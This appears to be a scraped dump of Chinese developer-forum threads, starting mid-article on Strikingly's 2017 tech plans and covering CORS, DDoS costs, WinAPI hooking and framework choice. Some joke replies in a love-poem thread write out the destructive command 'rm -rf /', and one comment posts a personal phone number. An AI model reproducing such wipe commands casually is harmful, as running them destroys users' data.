完全重写了所有的配置代码。现在我们可以在任何时候重复运行这些配置代码来把基础设施更新到最新定义，并且使用这些配置代码很快地创建新的沙盒环境来满足多个产品团队并行测试的需求。</p>\n<h2>容器的编排和集群管理</h2>\n<p>在确定微服务架构的演进方向之前，我们其实已经做了一些分布式计算的尝试，即将一部分相对独立的模块拆分出来作为独立的服务存在。尽管我们引入了 Docker 容器技术来管理应用的打包和部署，每个独立服务仍然各自分配和管理自己的基础设施和计算资源。对于每个独立的服务，我们都需要单独的配置文件来定义它的基础设施，并且需要对这些基础设计进行维护和监控。</p>\n<p>这种方案决定了系统整体的基础设施复杂度将随着服务数目的增加而线性增长。我们对于每个服务预留了一定流量爆发性增长的弹性空间，但不同的服务之间无法共享这些预留的弹性计算资源，也造成了一定的浪费。我们需要一个方案来解耦基础设施和服务之间的直接关联。</p>\n<p>具体来说，我们不仅仅需要容器来封装应用和它的运行环境，我们更需要一个容器调度、编排和集群管理方案，可以帮助我们管理下层的基础设施和计算资源，并作为资源池的形式提供给上层的应用容器消费。应用容器并不关心下层基础设施的管理和分配，基础设施也并不随着上层服务数目的变化而变化，只要基础设施提供了足够的计算资源给上层服务使用就可以。同时，这个方案中需要包含一套命令行工具甚至 Web 界面来让工程师更方便地创建和管理应用。简而言之，我们需要搭建一个简单易用内部的 PaaS 平台。</p>\n<p>目前容器领域内比较成熟的容器调度编排方案有以下几个：</p>\n<ul>\n<li>Docker 公司提供的 Docker Swarm</li>\n<li>Google 开源的 Kubernetes</li>\n<li>AWS 提供的 ECS 和 Blox Toolbox</li>\n</ul>\n<p>这些主流的容器调度编排方案都支持 Docker 的容器标准，目前我们正在测试和评估这些不同的方案，预计在 2017 年完成 PaaS 平台的设计和实现。</p>\n<h2><strong>自动化</strong><strong>回归</strong><strong>测试</strong></h2>\n<p>为了在快节奏迭代部署的同时保证产品可用性的稳定， 2016 年我们搭建了一套完整的自动化测试方案：从单元测试、集成测试、功能回归测试到 UI 回归测试。</p>\n<p>我们 CI/CD 的流程是这样的：</p>\n<p><img alt=\"\" src=\"http://i.imgur.com/96rG4yB.png\"></p>\n<p>单元测试和集成测试将会在 CI Tests 时跑。功能回归和 UI 回归测试就需要等待代码部署到沙盒环境后才会在 E2E (End-to-End) Tests 环节跑。在此之前，我们在单元测试和集成测试上已经下了很大工夫了， 2016 年重点解决的问题是搭建功能回归和 UI 回归测试。</p>\n<p>功能回归测试</p>\n<p><img alt=\"\" src=\"http://i.imgur.com/Y0IkYPX.png\"></p>\n<p>功能回归测试我们选用了来自蚂蚁金服的一套基于 WebDriver 协议的测试框架 - Macaca.js 。 WebDriver 协议对各种设备的交互已经制定了 API 规范， Macaca.js 也严格遵守了这套协议并为 Web 、 iOS 和 Android 都实现了对应的驱动。这就意味着我们的 QA 工程师只需要学习 Macaca.js 就可以测试 Web ， iOS ， Android 的应用。</p>\n<p>除了使用代码做自动化的功能回归测试，我们也用了 RainforestQA 众测（ crowd testing ）方案。在这个平台上，我们的 QA 工程师和产品团队只需要写好测试用例的步骤（ steps ），平台会自动分发给有测试经验的测试人员进行手动测试。</p>\n<p>步骤定义：</p>\n<p><img alt=\"\" src=\"http://i.imgur.com/L9WrNJe.png\"></p>\n<p>运行结果：</p>\n<p><img alt=\"\" src=\"http://i.imgur.com/UZJuvnv.png\"></p>\n<p>RainforestQA 是一个 24 小时都在运行的服务。相比于团队内部成员手动测试，这个方案平均把测试所需的时间缩短到原来的二十到三十分之一。也就是说，之前一位 QA 团队成员需要一天才能完成的测试，使用 RainforestQA 就可以在一小时内完成。</p>\n<p>UI 回归测试\n对于一款建站工具，在快速迭代的过程中，保证用户通过我们工具做出来的网站 UI 一致也是很重要的需求。我们采用了 UI 截图比对回归测试。在部署到沙盒环境上后，我们会做一些截图然后和上一次的截图（ base image ）做比对并高亮出两图之间的差别，只要截图有偏差就会报错并通知工程师和 QA 工程师进行排错。</p>\n<p><img alt=\"\" src=\"http://i.imgur.com/XE4V0fw.png\"></p>\n<p>在过去一年中，我们搭建了一套完整的从代码到部署的自动化流程，并完成了了一部分的功能回归测试用例。 2017 年我们的目标是基于这套流程达到 90% 的功能回归测试覆盖率。</p>\n<h2><strong>总结</strong></h2>\n<p>总结一下，我们希望在 2017 年实现以下目标：</p>\n<ul>\n<li>借助一致的技术栈极大提升多客户端团队的产品开发效率，做出更多更好的产品特性</li>\n<li>引入 GraphQL 重构 API 层，提供更丰富灵活的 API</li>\n<li>遵循 PORO 和依赖注入的思路，充分解耦后端产品代码的复杂度</li>\n<li>向微服务方向转型，提供更高的系统可用性，优化系统的自动伸缩能力，提升开发效率</li>\n<li>基于已有的自动化测试流程，加入更多的测试用例，使得功能回归测试达到 90% 的覆盖率</li>\n<li>构建基于容器编排的内部 PaaS 平台，简化基础设施的管理复杂度以及应用服务的管理</li>\n</ul>\n<p>最后，实现这些目标离不开一个技术能力和执行力都很强的技术团队，希望在 2017 年有更多的小伙伴能够加入我们，一起实现这些目标。<a href=\"https://zhuanlan.zhihu.com/p/25229006\" rel=\"nofollow\">Strikingly 2017 技术团队招聘</a>。</p>\n</div></div>"], "reply": "3", "tittle": "Strikingly 团队 2017 技术展望", "comment": ["可以，很强势", "拜读了", "对于非 Ruby 开发人员来说也很有帮助，赞！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>2017 年开春之际，诚意献上重磅大礼：阿里巴巴 Java 开发手册，首次公开阿里官方 Java 代码规范标准。这套 Java 统一规范标准将有助于提高行业编码规范化水平，帮助行业人员提高开发质量和效率、大大降低代码维护成本。</p>\n<p>点击下载《阿里巴巴 Java 开发手册》： <a href=\"http://click.aliyun.com/m/10473/\" rel=\"nofollow\">http://click.aliyun.com/m/10473/</a></p>\n<p>码出高效，码出质量！</p>\n<p>相比 C++代码规范业界已经达成共识， Java 代码规范业界比较混乱，我们期待这次发布的 Java 代码规范能够给业界带来一个标准，促使整体行业代码规范水平得到提高，最终能够帮助企业和开发者提升代码质量和降低代码故障率。</p>\n<p>阿里出品，质量保证！</p>\n<p>阿里 Java 技术团队一手打造出 Dubbo 、 JStorm 、 Fastjson 等诸多流行开源框架，部分已成为 Apache 基金会孵化项目；</p>\n<p>阿里在 Java 后端领域支撑起全球访问量最大的服务器集群；</p>\n<p>Java 代码构建的阿里双 11 业务系统订单处理能力达到 17.5 万笔 /秒；</p>\n<p>到目前已累计数亿行高并发、高稳定性的最佳 Java 代码实践；</p>\n<p>……</p>\n<p>此次首度公开的 Java 开发手册正是出自这样的团队，近万名阿里 Java 技术精英的经验总结，并经历了多次大规模一线实战检验及完善，铸就了这本高含金量的阿里 Java 开发手册。该手册以 Java 开发者为中心视角，划分为编程规约、异常日志规约、 MYSQL 规约、工程规约、安全规约五大块，再根据内容特征，细分成若干二级子目录。根据约束力强弱和故障敏感性，规约依次分为强制、推荐、参考三大类。此套规范不仅能让代码一目了然， 更有助于加强团队分工与合作、真正提升效率。</p>\n</div></div>"], "reply": "4", "tittle": "[ Java 编码规范] 《阿里巴巴 Java 开发手册（正式版）》发布！", "comment": ["没有回复？", "还要注册阿里云才能下载……", " ", "\r", "隔壁有人下载好了", " 感谢，已下载"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我在后端代码在响应头中设置了</p>\n<pre><code>Access-Control-Allow-Credentials ： true\nAccess-Control-Allow-Origin:*\n</code></pre>\n<p>按照 CORS 的规则： <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS#%E9%99%84%E5%B8%A6%E5%87%AD%E8%AF%81%E4%BF%A1%E6%81%AF%E7%9A%84%E8%AF%B7%E6%B1%82\" rel=\"nofollow\">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS#附带凭证信息的请求</a>\n，这个响应应该会失败。</p>\n<p>但实际上结果是这样的</p>\n<pre><code>Access-Control-Allow-Credentials:true\nAccess-Control-Allow-Origin:*\nConnection:keep-alive\nContent-Length:2514\nContent-Type:application/json\n\n</code></pre>\n<p>响应也成功了。</p>\n<p>请大佬指教- -</p>\n</div></div>", "<div class=\"topic_content\">- -是我对 CORS 认识不清，在开发的过程中，前端启用了 chrome 的 disable-web-security 的设置。\r<br>\r<br>开发完成以后我部署到线上环境，前后端是同一个 host 所以不存在跨域的问题，所以这个 Access-Control-Allow-Credentials 和 Access-Control-Allow-Origin 的设置也就没有意义了</div>"], "reply": "8", "tittle": "请教关于 CORS 中 Access-Control-Allow-Credentials 的问题", "comment": ["不太懂在问什么，但后端设置了这样的 header ，跨域请求时， withCredentials 为 true 的请求应该会带上 cookies 的。", "如果是需要带 cookie 等验证信息的请求，请加上\r", "xhrFields: {\r", "  withCredentials: true\r", "}\r", "参数，参照 jQuery1.5.1+的文档\r", "\r", " 目的是想通过 CORS 的规则，让前端请求接口的时候带上 cookies ，所以设置了 Access-Control-Allow-Credentials ： true 这样的响应头，同时之前设置的 Access-Control-Allow-Origin:*。这里按照文档应该会导致前端的这次请求失败，但结果是没有。\r", "\r", "withCredentials:true 是 jq 里面请求带上验证信息，这我知道。", " 嗯 withCredentials: true 前端这样设置了，的确将 cookies 信息传递上来了，但我困惑的是 CORS 规则里面说到：给一个带有 withCredentials 的请求发送响应的时候, 服务器端必须指定允许请求的域名,不能使用'*'.如果响应头是这样的:Access-Control-Allow-Origin: * ,则响应会失败.", "噢，这个问题我以前也遇到过，正常情况下，浏览器会把响应拦截了，你是通过浏览器访问的吗，还是浏览器做了如 Chrome 的 disable-web-security 的设置？", " Chrome 的 disable-web-security 的设置。\r", "哦你这么一说这个设置我知道为什么我会困惑了，其实没有发生跨域的问题。\r", "\r", "服务端这么设置了，前端开发的时候使用了 Chrome 的 disable-web-security 的设置，所以浏览器没有拦截响应。\r", "\r", "而我访问已经上线的前端页面时，因为前后端都是部署在同一个 host 上的所以不存在跨域的问题。\r", "\r", "那我还想在问一个问题，前端在本地开发的时候，会跨域，服务端的 Access-Control-Allow-Origin 应该如何设置呢，\r", "前端的文件在浏览器都是电脑内文件的地址。", "我最近也遇到 CORS 的问题，\r", "\r", "如果服务端是 Nginx 的话，可以参考 ", "\r", "\r", "if ($http_origin ~* ( https?://.*\\.example\\.com(:[0-9]+)?$)) {\r", "    add_header Access-Control-Allow-Origin: $http_origin;\r", "}", "  嗯 还可以这样在 nginx 中设置 这样可以把跨域的设置从代码中解耦出来 涨姿势了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>1.RT</p>\n<p>2.猿，猿，猿，三字成诗，没毛病。。。</p>\n</div></div>"], "reply": "69", "tittle": "程序猿版三行情诗，等你来写。", "comment": ["[情人版]( ", ")", "是你\r", "解放了我双手\r", "去拥抱美好的你", "啪", "啪啪", "啪啪啪", " 居然不换行", "比起机械键盘\r", "我更喜欢你\r", "所以能让我试试手感吗？", "SYN\r", "SYNACK\r", "ACK", "鼠标的手感\r", "果然\r", "没有你的好", "I have a pen\r", "I have an apple\r", "Apple pen", "相遇\r", "相知\r", "相守", "我\r", "性别:男\r", "爱好:女", "身边有你的时候\r", "即使是死循环\r", "我也开心", "遇见你\r", "靠近你\r", "离开你", "这几年\r", "代码写多了\r", "忘了怎么写情诗", "Girl gf;\r", "gf.smile();\r", "—— NullPointerException.", " 你这太悲伤了", " 没毛病 \r", " piapiapia\r", " 32 个赞\r", " 运维吗。。。\r", " 好软， 23333\r", " I have a dream I have a dream I have a dream\r", " 666\r", " 知道你喜欢妹子了...\r", " while(1){rm -rf /}\r", " 小学，中学，大学\r", " 为你写诗，为你写代码。。。\r", " smile ， 23333", "214\r", "啪啪啪\r", "青轴的声音", "买\r", "\r", "买\r", "\r", "买", "猿猿猿，曲项向屏歌，", "猿\r", "缘\r", "媛", "BEGIN\r", "# TODO\r", "END", "while True:\r", "    push()\r", "    pop()", " x64,23333\r", " xss or xml ddos\r", " 厉害了我的哥\r", " 缘 圆 远\r", " todo\r", " while(0){lpush rpush}", "挖掘了你的数据，", "却挖不出你的思想。", "黑进了你的电脑，", "也黑不进你的心。", "for 1", "exit; die; retufn false;", "装逼失败", " 666\r", " 死循环\r", " 233333", "好多年前，北漂单身落寞时写就：\r", "\r", "                        赏灯\r", "正月十五正月正，我邀伊人赏花灯。\r", "携手相依行且停，欢声笑语闹市中。\r", "悄然不知已入夜，遥指桂宫情更浓。\r", "留魂绕梦身早醒，一声长嗟叹梦中。\r", "今生良辰有几何，何人与我共今生。\r", "\r", "还一首中秋写的\r", "\r", "                        仲秋\r", "近仲秋，友难逢。世故人情尽抛却，独饮清风碾幽径。\r", "避繁世，觅冷清。欲摘天星作我伴，怎堪夜空亦凋零。", "我，\r", "爱你，\r", "是一首写不完的诗。", "我本无情，\r", "你的出现，\r", "却成为我人生最大的 bug 。", " 是我人生最大的 bug ，似乎更好些", "无意冒犯，但是起了一身鸡皮疙瘩", "女盆友？\r", "滚粗\r", "我要写代码", " 6666", "这个婆娘不是人,\r", "九天仙女下凡尘。\r", "华容月貌却做贼,\r", "悄悄偷去我的心。", "  应该这样\r", "\r", "啪啪啪啪啪\r", "\r", "啪", " 就服你", " 这是个悲伤的故事😂", "女朋友\r", "远没有\r", "代码好玩", "你\r", "在\r", "哪", "女朋友\r", "是个\r", "啥", "啪\r", "啪\r", "啪", "你\r", "为何\r", "泄了气", "是\r", "被你\r", "扎漏了", "你问我浪漫是什么\r", "我说：共享内存，搭服务器。\r", "其实我想说的是： Sharing memories , Form a CP with U", "302\r", "408\r", "404", "你的天空布满星辰\r", "遇见你花了我许多运气\r", "余生请你指教", "unzip; strip; touch; finger; mount;\r", "fsck; more; yes;\r", "unmount; sleep;", " \r", "\r", " ", "\r", "\r", "左边 Safari 右边 Chrome", " 这剧本太生动了", "loveme || rm -rf /", "无\r", "要求\r", "new", "我到你\r", "我就想\r", "脱裤子", "每年都整这些，换点创意吧", "我爱你\r", "你爱他\r", "他爱她", "裤子都脱了\r", "你给我\r", "看这个？", "Begin \r", "Run \r", "End", "for(;;) I love you\r", "for(;;); I love you too\r", "end", "我\r", "你\r", "我们", " 厉害了我的哥\r", " bug  bug bug \r", " 你是个好人\r", " 23333\r", " 666 楼下回复更 6\r", " 0.0\r", " 从恋爱到跑路\r", " 污...\r", " for(;;) die\r", " 2333", "一人，我编程累\r", "日渐消瘦人憔悴", "我，\r", "是一名同志，\r", "独行侠的肩膀会是你单只蝴蝶的落脚点。", "情人节快乐\r", "快你麻痹\r", "滚", "今天是 2 月 13 日\r", "今天是 2 月 14 日\r", "今天是 2 月 15 日", "push\r", "pull\r", "push", " 6666\r", " 厉害了我的日期", "while(0)\r", "if(you)\r", "break;"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前用的是联通， 443 端口没被屏蔽，现在打算换电信，不知 443 端口是否可用</p>\n</div></div>"], "reply": "9", "tittle": "求告知，北京电信 443 端口被屏蔽了吗", "comment": ["如果 443 被封了，岂不是很多网上银行都用不了？", " 应该指的是光猫的 443", " 楼主说的是指家庭用户。", " 封用户这一端 443 ，又不是封网银服务器的 443", "石家庄电信没问题", "你先搞清楚进和出", "是我理解错了", " 明显问的入站", "昨天打客服电话，得知所住小区没有电信光纤，正好省得纠结了，谢谢大家"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，比如我买个阿里云的主机选择按流量付费，如果都是正常使用，那么可能是比较合算的，但是如果遇到 ddos ，流量就暴增了，而且还是浪费的流量。在建站初期要不要考虑这些问题呢？</p>\n</div></div>"], "reply": "25", "tittle": "云主机按流量付费，做一个小站要不要考虑被 ddos 的问题？", "comment": ["正常的站不考虑，假如要是一些特殊的小站，你还是考虑吧。", "这个和行业有很大关系，正常的没人攻击的，顶多有个刷评论广告啥的。如果是特殊行业，攻击肯定多，不过那种行业利润比较高，也可以 cover 住这些成本。", " \r", " \r", "\r", "哦哦，谢谢，主要是国内流量太贵了", "不用， 被攻击了云盾会自动把你服务器黑洞掉， 不费流量。", "你把峰值调到适当大小， DDOS 有时候是无辜被牵连的", " 黑洞掉不是就访问不到了么-。-", "楼上几位总结的很好了。关于费用问题，我想说你为什么要按流量付费呢，如果是做个博客啥的，一两百的云主机足够了，也不贵啊", " 是的，想要抗 ddos 得要购买额外的安全服务， 比正常流量贵多了。", " 国内的云主机不按流量，带宽都是 1M 起，太小，我不是做博客的，虽然现在才起步，但还是抱着有一定用访问量来考虑的", "正常情况下， 阿里云会根据帐号等级给予免费的攻击防护， 好像是 10G 左右吧。 受到攻击时云盾自动筛选攻击流量， 在免费防护以内，网站可以正常访问。在免费防护以外， 又没购买防护流量的话， 服务器被拖入黑洞。若干小时后才放出。", "前期不用想太多，服务器都可以平滑升级的。前期随便搞个用着，不够了再升级，别想着一步到位。", "如果要分享到这里，必须考虑 DDOS 。", " 😝，被你这么一说有点方", "当年被搞过，阿里云计费欠好几万，阿里云不管，磨了好久才解决", " 你需要多大的带宽，我做云计算这块，有几年了，介绍了不少 C 端的用户，其实这些用户觉得贵，本质原因是项目盈利能力不够强，只要不是免费，用户就会觉得贵，如何帮用户盈利，才是大问题。目前云计算厂商，经常做活动，如果你的项目能盈利，找个活动打折的，应该至少能不亏吧。其实盈利这个，我个人也在摸索，好多时候，运气比较重要，我有个网站不更新 1 年了还有人投广告，感觉真是运气。", "阿里云会帮助你自动黑洞的，你可以放心使用。\r", "\r", "好吧，正经点：其实假如阿里云不黑洞，你花不了多少流量的钱，因为 DDOS 时，主要是别人给你发包，你不往外发包，所以你不要交钱： ", " “互联网流入云服务器的流量是免费的”\r", "\r", "阿里云之所以有黑洞，就是为了赚 DDOS 高防的钱，而不是为了帮你省钱", "楼上+1   流入流量是不计费的", " 酱紫啊，涨姿势了， THX", " CC 呢？", " CC 基于 HTTP 级别，能轻易刷走流量，控制的好的话也不会触发黑洞。总之这种有针对性质的攻击都很难解决。 Nginx 的 limit_req 和限带宽的有一点用，但是攻击者 IP 众多就无解了。", "如果你想在社交网站公开你的小站，就要用最坏的恶意去揣测别人。", "按照原理， DDoS 在网关就被处理了。。还轮不到你的实例\r", " \r", "如果你是按流量计费的，你更应该关心是否会被 CC 攻击，特别是在对方 IP 多而且伪装成正常流量的时候", "可以考虑想办法不暴露你的 ip 隔个 CDN 啥的", " 看了下 cc 攻击的原理，如果多 ip 控制量，貌似用屏蔽 ip 的规则也很难有效防御-。-，难不成只能当帮我刷流量了么", " 是的 。。只能是被刷了呗，而且云盾帮你清洗流量的时候、你的真实访客也无法正常访问你网站的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>喜欢这种手感，需要一个外接。</p>\n<p>试了一下 think life, 不能更糟，纯属坑钱，已退货</p>\n</div></div>"], "reply": "9", "tittle": "有和 think pad 的巧克力键盘手感比较接近的外接键盘么", "comment": ["不是有蓝牙的 ThinkPad 键盘吗？", "戴尔 latitude 系列键盘手感也可以", "如果不追求蓝牙，有线也是一个比较经济的选择。手感总体比 T 系列键盘稍单薄一点，但是跟 X 差别不大。因为键盘厚度不够，手感是机器自带键盘的 90%左右。但是已经很爽了，而且还带小红点。\r", "苹果蓝牙键盘 2 代手感可以", "2L 的低价版： ", "谢谢各位！", "自从用了机械键盘，我已经再也不想开笔记本了", "自从用了微软 6000 ，普通形状的键已经用不习惯了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>面了几家，基础的东西问的不多，大部分都是问公司和做的项目，然后说自己的公司情况，然后就没有然后了。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "深圳这边招聘都要求项目和工作经验吗？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>英文的分词也不只是用空格分开那么简单，比如： The golden gate bridge is located in San Francisco ，这句话如果简单的用空格 explode 的话，最终会将“ golden gate bridge ”以及“ San Francisco ”给分拆开来而失去原有的意义，有没有这方面英文词组相关的分词 api 或者开源程序？</p>\n</div></div>"], "reply": "12", "tittle": "除了中文分词，英文有没有相关分词的 API 或者开源软件？", "comment": ["你想多了，这已经不是简单的分词了，是 entity extraction 了", "second order phrase model", " 这不是 n-gram 么……", "stanford 有开源的 NLP 包", "所以一般英文处理的时候会保留位置信息...", " n-gram 只是方法", " 我说 extraction 也不对，应该叫 recognition", "是想做 named entity recognition 还是 tokenization?", "反正可以看看 standford 的 ", " 或者 NLTK", "还有那种没有空格的，比如： goldnecklace(gold necklace)", "斯坦福的 CoreNLP ，如果是 Java 程序员的话可以直接用，也可以配合 Python NLTK ，另外连续相同的单词首字母大写可以划分为一个词咩（逃", "wocao ，英文分词你还要怎么样！"]},
{"content": ["<div class=\"topic_content\">是这样的 一个程序 打开之后从 Windows “我的文档”文件夹里面读取配置，我要让它从我自定义的文件夹读取配置该怎么办？\r<br>\r<br>我的想法就是让程序认为我自定义的文件夹就是“我的文档”，有没有什么办法啊？我暂时想到的可能可以 hook 系统函数， 但是不知道具体是哪个函数</div>"], "reply": "10", "tittle": "这种情况应该 hook 哪个 WINAPI？？？", "comment": ["SHGetFolderLocation\r", "SHGetSpecialFolderLocation\r", "SHGetKnownFolderPath\r", "SHGetSpecialFolderPath\r", "SHGetFolderPath\r", "\r", "这类 api 挺多的...这几个都行吧，我也忘了，慢慢测吧....", "感谢啊 我查了一下程序 import 的 function ，应该用的是 SHGetFolderPath", "一个或许更简单的方法，供楼主参考：在我的文档下面创建一个到自定义文件夹的符号链接。 Windows 上可以用 mklink 来创建。", "也有可能是环境变量吧", "“我的文档”文件夹的位置是可以更改的呀，这是最简单的方法， Hook 也可以，但是太麻烦了。", "最简单的是把我的文档删除，把你自定义的文件夹通过 mklink /D \"我的文档\" \"你文件夹“", "hook CreateFile 不是更方便么，连文件名都能改了", "一楼的回复不正确， 因为你在这些函数里面是不能知道判断是否是在加载你的文件。\r", "\r", "正确是 Hook CreateFile, 里面可以读取完整的文件路径，判断是否你要处理的文件，然后替换自己的文件。", " @", " \r", "额 不仅仅是改变我的文档的问题 还涉及到程序多开 所以最好要可以每个进程都可以自己设置读取配置文件的位置", " \r", " \r", "我 hook 了 SHGetFolderPathW 发现程序也确实调用了这个函数……但是我 hook 之后对原来的函数没做更改 只是测试一下程序调用这个函数的参数和运行结果 结果返回文件路径都是乱码 用 SHGetFolderPath 就一切正常\r", "\r", "总之就是我 hook 了 SHGetFolderPathW 但是没做任何改变，结果程序在 hook 后在当前目录下建了个乱码文件夹存放配置。。。\r", "\r", "看来我还要再研究研究这个 Unicode 和 ASNI 编码有什么影响\r", "\r", "另外这个 createfile 程序也有调用 我还没来得及看它是干啥用的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>对于这几个框架了解甚少，现在想学，但是不知道哪个更容易学一点，望各位大神指点。也希望各位大神能指点一下学习技巧</p>\n</div></div>", "<div class=\"topic_content\">各位大神，可以适当发点相关学习资料砸砸我</div>"], "reply": "63", "tittle": "vue/react/angular 哪个更容易学", "comment": ["vue 相对简单些", "都不要学，我为了省下页面文件大小， jQuery 那些全都不要，就写纯原生 js", "vue 和 vue 的整个生态都很易学， react 本身简单，但是生态极其复杂， angular 概念太多，容易写出匪夷所思的代码", " 但是现在找工作，招聘信息百分之 90%都要求这几种框架会其中一种，找工作都不好找", "react 最简单的！", "vue 更容易学，不过 react 作为当今最火热的前端框架你不管去哪都是不可避免的，所以不要抱着只学哪一个的想法，这么说吧，从实际也从学习的角度，你可以只学 react 或者两个都学，但是不能只学 vue", " 好的，非常感谢你的建议，我会在 Vue 和 angular 中二选一，会再斟酌一下。", " 三者当中，对于 react 的了解是最少的", "无论学什么, 最好会用 React", "优先 React ，工作机会更多一些。然后是 Vue Angular ，都学一些比较有好处", "都容易，推荐 React", "那个都不易，而且现在更新换代这么快，且已开始趋同，所以学那个到后来都一样。", "相信我 Vue.js 是最容易的， Angular 就考虑了， React 用的最多，但是 React 自身的功能是在有限，生态圈及其复杂，什么 redux 够你玩一阵的了，工作来看 React 是最容易的，无论是国内外。。", "不要考虑 vue 了，直接 React", "仅从容易的角度来看，肯定是 vue\r", "react 的理念是最简单的，但是写起来——为了各种最佳实践——要多花 500%的时间", " 这就是所谓的“难者不会，会者不难”吗 /(ㄒoㄒ)/~~", "@所有  可以给点 react 学习视频吗", "react+mobx 挺好用的。但是有些东西还是需要项目经验才能理解为何设计成这样。所以初学的话还是从 vue 开始吧，中文文档也多。", "我投 vue 一票 vue 有模板 if 模板 for vuex 也比 redux 今天", "vue 啦", "我投 vue 一票，硬广在这 ：我录的 vue 视频 ", "vue > react > angular", "为什么没人推荐 angular", "react 生态最好啊", "vue 路过，包你两天看着官方文档做项目。", "vuejs 简单， react 公司需求量更大。。。", "vue 不要用 webpack es6 也能直接用起来。\r", "\r", "不过，入门了以后，就可以直接上 react 了，毕竟 react 需求最大。", "React ＞ Angular2 ＞ Vue", "公司需求上 react>angular>vue", "要说容易上手，应该是 Vue\r", "要说简单，应该是 React 简单，当然只是 React 本身，不包括生态里的其他库", "大部分人认为 vue 最容易学，但我还是觉得 react 最简单", "强烈推荐 vue ， reactjs 的生态虽然庞大，但是不简练。", "vue 简单易用, react 简单不易用, angular... 这个在走下坡路", "本人现在面临找工作，有 react 、 vue 资源分享吗？十分感激", " 21 楼", " 你前端几年？私下可以交流交流  15718871379  我微信", "学习路线：\r", "React => Vue => NG2\r", "\r", "这三个资料都看官方文档就行了。\r", "NG2 如果新概念多，可以看下大漠的视频：\r", "资料: ", "\r", "视频: ", "\r", "\r", "第一次 React 大楷一周适应，后面就很快了。\r", "学完  React 学 Vue 大楷需要 1 小时， NG2 大楷需要 1 天，看你平时关注没了。", "只考虑容易学的话 应该是 vue", " 感谢 O(∩_∩)O", "最容易上手肯定是 vue", "vue 吧。。。可惜我一都不会，学习计划已经延迟到明年了。。哈哈", "自己的项目我用 vue ，公司的项目用 ng ， react 观望中。。", "如果以找工作为目的，那么学习难度不该是影响你选择的因素（多难你都得学）。它们 3 个都不难，看你的意向公司（或大多数公司在用啥）需要啥了\r", "\r", "综上，这种问题拿到 v 站问是没有结果的。去求职网站上搜一下就好。", "要学 Vue 的话可以试试 vbuild [doge] ", "都容易", "借宝地问下，我现在 JavaScript 只了解了基本概念闭包、作用域、原型链啥的，基本都用 jQuery 写些特效。框架就会用个 Bootstrap 该不该选个 js 框架学下啊。找工作找的好迷茫啊", "就是， 为啥推荐 angular 的那么少呢？", "不专职前端都不要学，好好学英语。专职前端就 vue 或 react", "说简单 毫无疑问 vue 看一会儿你就会了", "想继续做移动开发的话试试 React 吧， \r", "刚发了个项目 可以参考下~ ", "建议学 angular", "vue 的生态远远不如 angular ，", "如果喜欢静态语言的用 Angular 2", "你要考虑 React Native", "抛开场景聊方案都是耍流氓", "应该是这样，花 3.5 小时学习 angular 、 2.5 小时学习 react 、 2 小时学习 vue ，好了，一天工作内容饱和了。", "react 很好学吗。。。\r", "\r", "\r", "data flow 到现在都解释不清。。", "React\r", "非常简单", " 兄弟你没上 redux 套装吧。。。", "会 React 会 Vue ，不造 NG2 学习动力在哪.. 没啥有意思的需求玩😂", " 舅服你 ：）", " 233 angular 的生态远不如 jQuery ， jQuery 的生态远不如 vanilla js", " redux 比 React 更简单啊，单向数据流，全局唯一数据集合。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前网站的站内搜索功能，想按照 microdata 方式来写， <a href=\"http://schema.org\" rel=\"nofollow\">schema.org</a> 给出的参考例子为： <a href=\"https://schema.org/SearchAction\" rel=\"nofollow\">https://schema.org/SearchAction</a> ， 如下代码：</p>\n<div>\n<pre><code>&lt;link itemprop=\"url\" href=\"http://www.example.com/\"/&gt;\n\n&lt;form itemprop=\"potentialAction\" itemscope itemtype=\"http://schema.org/SearchAction\"&gt;\n\n      &lt;meta itemprop=\"target\" content=\"http://example.com/search?q={query}\"/&gt;\n      \n  &lt;input itemprop=\"query-input\" type=\"text\" name=\"query\"/&gt;\n  \n  &lt;input type=\"submit\"/&gt;\n  \n&lt;/form&gt;\n</code></pre>\n</div>\n这样 form 表单最终生成的 URL 就不是伪静态的了，与 SEO 的原则违背，我想最终提交的表单生成的 URL 为这种样式： www 。 example 。 com/search/this-is-my-query-words.html ，目前只想到两种方法：\n<ol>\n<li>用 js 阻止 form 的 submit()，然后用 js 构造 URL 再跳转</li>\n<li>form 表单提交后的 URL ，服务器 header 301 的跳转到 www 。 example 。 com/search/this-is-my-query-words.html</li>\n</ol>\n<p>上面两种方法貌似都不太好，求 V2 们给出最合理的答案，谢谢</p>\n</div></div>"], "reply": "7", "tittle": "form 表单通过 GET 方式提交的 URL，怎样自定义它的形式？", "comment": ["你用 form GET 提交就会变成不友好的。所以用第一个方法吧。", "表单 GET 方式提交的 URL   搜索引擎根本不感兴趣   也不会去抓取 也没法去抓取", " 我会将用户搜索的 URL 存到 sitemap 里面去", "扯了这么长还是没说清楚自己想要什么样的。\r", "\r", "“求 V2 们给出最合理的答案”\r", "\r", "你是要我们玩猜谜游戏吗，那起码给点提示好么", "\r", " ->\r", "\r", "\r", "写一条 rewrite 规则，我没理解错吧", "seo ? 弄个热门搜索呗", "搜索引擎好像不会去抓你动态生成的 query words 吧？"]},
